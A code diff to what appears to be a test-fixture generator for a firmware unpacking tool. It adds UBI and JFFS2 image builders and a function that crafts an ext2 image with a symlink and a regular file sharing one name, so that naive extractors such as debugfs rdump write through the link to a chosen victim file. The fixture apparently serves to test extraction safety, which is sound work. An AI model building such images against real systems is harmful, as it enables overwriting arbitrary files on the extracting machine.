@@ -269,6 +269,36 @@ def ext4_image(src_dir: Path, out: Path, size_mb: int = 8) -> Path | None:
     return out
 
 
+def _mtd_tool(name: str) -> str | None:
+    return shutil.which(name) or (f"/usr/sbin/{name}" if Path(f"/usr/sbin/{name}").exists() else None)
+
+
+def ubi_image(src_dir: Path, out: Path) -> Path | None:
+    mkfs, ubinize = _mtd_tool("mkfs.ubifs"), _mtd_tool("ubinize")
+    if not (mkfs and ubinize):
+        return None
+    ubifs = out.with_suffix(".ubifs")
+    subprocess.run([mkfs, "-q", "-r", str(src_dir), "-m", "2048", "-e", "129024", "-c", "128", "-o", str(ubifs)],
+                   check=True, capture_output=True, timeout=120)
+    cfg = out.with_suffix(".cfg")
+    cfg.write_text(f"[ubifs]\nmode=ubi\nimage={ubifs}\nvol_id=0\nvol_type=dynamic\nvol_name=rootfs\n"
+                   "vol_flags=autoresize\n")
+    subprocess.run([ubinize, "-o", str(out), "-m", "2048", "-p", "128KiB", "-s", "512", str(cfg)],
+                   check=True, capture_output=True, timeout=120)
+    cfg.unlink()
+    ubifs.unlink()
+    return out
+
+
+def jffs2_image(src_dir: Path, out: Path) -> Path | None:
+    mkfs = _mtd_tool("mkfs.jffs2")
+    if not mkfs:
+        return None
+    subprocess.run([mkfs, "-r", str(src_dir), "-o", str(out), "-e", "128KiB"], check=True, capture_output=True,
+                   timeout=120)
+    return out
+
+
 def mbr_disk(partition_image: Path, out: Path) -> Path:
     data = partition_image.read_bytes()
     lba = 2048
@@ -361,6 +391,10 @@ def generate_all(dest: Path) -> dict[str, Path]:
     sq = squashfs_image(rootdir, dest / "companion_rootfs.squashfs")
     if sq:
         out["squashfs"] = sq
+    for key, fn, name in (("ubi", ubi_image, "companion_rootfs.ubi"), ("jffs2", jffs2_image, "companion_rootfs.jffs2")):
+        img = fn(rootdir, dest / name)
+        if img:
+            out[key] = img
     ext = ext4_image(rootdir, dest / "companion_rootfs.ext4")
     if ext:
         out["ext4"] = ext
@@ -381,4 +415,31 @@ def generate_all(dest: Path) -> dict[str, Path]:
     out["nested"] = nested_archive(dest / "malicious_nested.zip")
     out["random"] = dest / "random_encrypted.bin"
     out["random"].write_bytes(bytes(RNG.getrandbits(8) for _ in range(256 * 1024)))
+    return out
+
+
+def ext_duplicate_entry_attack(out: Path, victim: Path) -> Path | None:
+    """ext2 image whose directory holds a symlink 'aa' -> <victim> and a *regular file also named 'aa'*.
+
+    Extractors that create the symlink and then write the second entry by name (debugfs rdump) write
+    through the link to <victim>. Built by creating 'aa' (link) + 'ab' (file) and patching the dirent name.
+    """
+    mkfs = shutil.which("mke2fs") or ("/usr/sbin/mke2fs" if Path("/usr/sbin/mke2fs").exists() else None)
+    if not mkfs:
+        return None
+    src = out.parent / (out.name + ".src")
+    src.mkdir(parents=True, exist_ok=True)
+    (src / "aa").symlink_to(victim)
+    (src / "ab").write_text("PWNED-BY-FIRMWARE\n")
+    with out.open("wb") as fp:
+        fp.truncate(1024 * 1024)
+    subprocess.run([mkfs, "-q", "-F", "-t", "ext2", "-d", str(src), str(out)], check=True, capture_output=True,
+                   timeout=60)
+    data = bytearray(out.read_bytes())
+    i = data.find(b"\x02\x01ab")  # name_len=2, file_type=regular, name="ab"
+    if i < 0:
+        return None
+    data[i + 2:i + 4] = b"aa"
+    out.write_bytes(bytes(data))
+    shutil.rmtree(src)
     return out
